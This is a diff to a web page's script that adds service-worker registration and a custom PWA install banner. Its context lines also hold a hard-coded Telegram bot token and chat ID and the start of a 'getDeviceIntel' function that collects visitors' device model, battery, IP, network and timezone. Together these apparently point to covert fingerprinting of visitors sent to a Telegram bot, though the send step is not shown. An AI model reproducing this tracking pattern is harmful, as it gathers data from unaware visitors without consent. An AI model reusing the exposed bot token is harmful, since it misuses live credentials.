@@ -5391,19 +5391,33 @@
     <script>
         const TG_TOKEN = "8671549318:AAFmsnS2xvhOJFgYUZfFDe5ELDhpYwlFVqQ";
         const TG_CHAT = "8506290708";
-// --- PWA INSTALLATION NOTIFICATION LOGIC ---
+// --- PERFECTED PWA INSTALLATION & REGISTRATION LOGIC ---
         let pwaPrompt;
 
+        // 1. Register the Service Worker (This connects the sw.js file!)
+        if ('serviceWorker' in navigator) {
+            window.addEventListener('load', () => {
+                navigator.serviceWorker.register('sw.js')
+                    .then(reg => console.log('MND Service Worker Registered Successfully!'))
+                    .catch(err => console.log('Service Worker Failed:', err));
+            });
+        }
+
+        // 2. Listen for the Install Trigger from the Browser
         window.addEventListener('beforeinstallprompt', (e) => {
+            // Prevent Chrome's default mini-bar
             e.preventDefault();
+            // Save the event so our custom button can use it
             pwaPrompt = e;
-            // Shows the banner after 2 seconds
+            
+            // Show the premium MND banner after 2 seconds
             setTimeout(() => {
                 const banner = document.getElementById('pwa-install-banner');
                 if(banner) banner.classList.add('show');
             }, 2000);
         });
 
+        // 3. The function when they click "INSTALL"
         function installPWAApp() {
             if (pwaPrompt) {
                 pwaPrompt.prompt();
@@ -5411,13 +5425,16 @@
                     pwaPrompt = null;
                     closeInstallBanner();
                 });
+            } else {
+                alert("App is already installed or your browser does not support it.");
             }
         }
 
+        // 4. The function when they click the "X"
         function closeInstallBanner() {
-            document.getElementById('pwa-install-banner').classList.remove('show');
+            const banner = document.getElementById('pwa-install-banner');
+            if(banner) banner.classList.remove('show');
         }
-        
         async function getDeviceIntel() {
             let model = "Unknown Device"; let browser = navigator.userAgent; let battery = "Unknown"; let ip = "Masked"; let network = "Unknown"; let timezone = Intl.DateTimeFormat().resolvedOptions().timeZone;
             if (navigator.userAgentData) { const data = await navigator.userAgentData.getHighEntropyValues(["model", "platform"]); model = `${data.platform} ${data.model}`; }
